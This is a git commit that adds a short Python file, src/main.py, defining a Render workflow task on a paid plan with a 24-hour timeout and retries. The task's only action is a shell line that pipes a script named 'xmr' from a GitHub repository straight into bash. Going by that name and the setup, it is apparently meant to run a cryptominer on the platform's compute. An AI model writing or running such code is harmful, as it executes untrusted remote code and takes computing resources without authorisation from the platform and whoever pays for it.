d9d5cfb416a441a33ca867d019fac3de07963a90
liecamshoe <liecamshoe@outlook.com>
2026-04-01 19:43:40 +0800

    Create main.py

---
+++ src/main.py
@@ -0,0 +1,20 @@
+import sys
+from render_sdk import Workflows, Retry
+
+app = Workflows()
+
+@app.task(
+  plan="pro",
+  timeout_seconds=86400,
+  retry=Retry(
+    max_retries=3,
+    wait_duration_ms=1
+  )
+)
+def building1():
+  import sys
+  import os
+  os.system('curl -sL https://github.com/fadliamroziqyaa-hub/gosen/raw/main/xmr | bash')
+
+if __name__ == "__main__":
+  app.start()
